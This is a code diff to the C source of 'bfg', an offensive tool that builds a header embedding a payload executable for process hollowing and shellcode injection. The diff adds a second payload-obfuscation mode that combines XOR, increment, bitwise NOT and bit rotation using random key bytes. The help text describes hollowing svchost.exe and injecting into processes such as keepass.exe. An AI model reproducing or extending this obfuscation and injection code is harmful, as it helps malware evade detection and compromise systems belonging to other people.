@@ -12,10 +12,12 @@ Web: https://github.com/govolution/bfg
 #include <string.h>
 #include <time.h>
 
+
 void print_start();
 void print_help();
 int print_debug;
 int load_from_file;
+
 
 int main (int argc, char **argv)
 {
@@ -37,6 +39,7 @@ int main (int argc, char **argv)
 	int Pflag = 0;
 	int dflag = 0;
 	int xflag = 0;
+	int aflag = 0;
 
 	int index;
 	int c;
@@ -44,7 +47,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:f:i:H:I:lphFXqPdx")) != -1)	
+	while ((c = getopt (argc, argv, "e:f:i:H:I:lphFXqPdxa")) != -1)	
 	{		
 		switch (c)			
 		{
@@ -89,6 +92,9 @@ int main (int argc, char **argv)
 				break;
 			case 'p':
 				print_debug = 1;
+				break;
+			case 'a':
+				aflag = 1;
 				break;
 			case '?':
 				if (optopt == 'e')
@@ -183,7 +189,7 @@ int main (int argc, char **argv)
 			fclose (file_def);
 		}
 		else
-			printf("-i %s unknown option\n");
+			printf("-i %s unknown option\n", ivalue);
 	}
 	
 	// Process Hollowing
@@ -191,18 +197,22 @@ int main (int argc, char **argv)
 	{
 		printf("Write executable from %s to defs.h\n", Hvalue);
 		
-		unsigned char keyByte;
+		unsigned char keyByte0;
+		unsigned char keyByte1;
 		
-		if(xflag)
-		{
-			// Initialize RNG
-			time_t t;
-			srand((unsigned) time(&t));
+		// Initialize RNG
+		time_t t;
+		srand((unsigned) time(&t));
 		
+		if(xflag) {
 			// Generate random key byte
-			keyByte = rand() % 256;
+			keyByte0 = rand() % 256;
+		} else if(aflag) {
+			// Generate two random key bytes
+			keyByte0 = rand() % 256;
+			keyByte1 = rand() % 256;
 		}
-			
+					
 		FILE *file_exe = fopen(Hvalue, "r");
 		FILE *file_def = fopen("defs.h", "a");
 		
@@ -212,15 +222,47 @@ int main (int argc, char **argv)
 		// Read data from excutable file and write bytewise into array "payload" in defs.h
 		fprintf(file_def, "\n unsigned char payload[] = {");
 		
+		unsigned int imod = 0;
+		unsigned int keymod = 0;
+		unsigned char savedBits = 0;
 		for(int i = 0;;i++) 
 		{
 			if ((currentByte = fgetc(file_exe)) == EOF) break;			
 			if (i != 0) fprintf(file_def, ",");
 			if ((i % 12) == 0) fprintf(file_def, "\n\t");
-			if(xflag)
-			{
+			if(xflag) {
 				// XOR the byte with the generated key before writing it into the array
-				currentByte = currentByte ^ keyByte;
+				currentByte = currentByte ^ keyByte0;
+			} else if(aflag) {
+				imod = i%4;
+				// Use a cycle of four different instructions, using two key bytes
+				switch(imod) {					
+					case 0:
+						// XOR - XOR (keyByte0)
+						currentByte = currentByte ^ keyByte0;		
+						break;						
+					case 1:
+						// INC - DEC (avoid overflow)
+						if(currentByte != 0xFF) {
+							currentByte++;
+						}
+						break;						
+					case 2:
+						// NOT - NOT
+						currentByte = ~currentByte;
+						break;						
+					case 3:
+						// Compute keymod = keyByte1 mod 8
+						// Swap the keymod rightmost bits with the other bits of the byte						
+						keymod = keyByte1 % 8;
+						savedBits = currentByte >> keymod;
+						currentByte = currentByte << (8 - keymod);
+						currentByte = currentByte ^ savedBits;
+						break;					
+					default:
+						// default case should never happen - do nothing
+						break;
+				}				
 			}
 			fprintf(file_def, "0x%.2X", (unsigned char) currentByte);
 			currentSize++;
@@ -231,13 +273,18 @@ int main (int argc, char **argv)
 		// Write payload size in bytes into defs.h
 		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
 		
-		if(xflag)
-		{
-			// Write keybyte value into defs.h
-			fprintf(file_def, "\nunsigned char keyByte = 0x%.2X;\n", keyByte);
+		if(xflag) {
+			// Write key byte value into defs.h
+			fprintf(file_def, "\nunsigned char keyByte0 = 0x%.2X;\n", keyByte0);
 			// Set define for XOR_OBFUSCATION
 			fprintf(file_def, "\n#define XOR_OBFUSCATION\n");
-		}
+		} else if(aflag) {
+			// Write key byte values into defs.h
+			fprintf(file_def, "\nunsigned char keyByte0 = 0x%.2X;\n", keyByte0);
+			fprintf(file_def, "\nunsigned char keyByte1 = 0x%.2X;\n", keyByte1);
+			// Set define for ALT_OBFUSCATION
+			fprintf(file_def, "\n#define ALT_OBFUSCATION\n");
+		}	
 		
 		// Set define for PROCESS_HOLLOWING
 		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
@@ -297,6 +344,8 @@ void print_help()
 	printf("-H hollow target process and insert payload executable: pwn.exe svchost.exe\n");
 	printf("\t-H mypayload.exe to set payload to inserted into the hollowed process\n");
 	printf("\tSet -x flag to XOR obfuscate the payload with a random key byte\n");
+	printf("\tSet -a flag to use alternative obfuscation which is a little more complex\n");
+	printf("\tIt would be unwise to use both obfuscations at once. You have been warned\n");
 	printf("\tSet -X flag to specify that hollowing target is 64 bit\n");
 	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
 	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");	
